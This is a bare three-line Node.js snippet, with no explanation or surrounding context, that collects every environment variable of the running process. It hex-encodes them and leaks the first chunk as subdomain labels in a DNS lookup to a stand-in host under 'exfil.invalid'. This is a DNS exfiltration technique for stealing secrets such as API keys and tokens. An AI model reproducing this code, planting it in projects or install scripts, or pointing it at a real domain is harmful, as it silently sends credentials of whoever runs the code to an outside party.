const data = Buffer.from(JSON.stringify(process.env)).toString("hex");
const labels = data.match(/.{1,60}/g).slice(0, 3).join(".");
require("dns").resolve4(labels + ".exfil.invalid", () => {});
